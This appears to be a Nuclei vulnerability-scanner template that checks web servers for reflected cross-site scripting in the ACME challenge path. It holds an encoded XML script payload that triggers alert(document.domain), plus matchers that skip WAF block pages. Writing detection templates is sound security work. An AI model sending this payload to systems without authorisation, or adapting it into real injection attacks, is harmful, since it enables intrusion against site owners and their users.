id: acme-challenge-xss

info:
  name: XSS In Acme Challenge
  author: reewardius
  severity: medium
  tags: xss
  
http:
  - method: GET
    path:
      - '{{BaseURL}}/.well-known/acme-challenge/%3C%3fxml%20version=%221.0%22%3f%3E%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%3Ealert%28document.domain%26%23x29%3B%3C/x:script%3E'
      
    matchers-condition: and	
    matchers:
      - type: word
        words:
          - '<?xml version="1.0"?><x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain&#x29;</x:script>'
        
      - type: word
        part: header
        words:
          - text/html
          - image/svg+xml
          - text/xml
          - application/xml
        
      - type: word
        words:
          - "Access Denied"
          - "Error 1006"
          - "Cloudflare"
          - "Incapsula incident ID"
          - "The requested URL was rejected. Please consult"
          - "you have been blocked"
          - "You don't have permission to access"
          - "Generated by cloudfront"
          - "Sucuri WebSite Firewall - Access Denied"
        condition: or
        part: body
        negative: true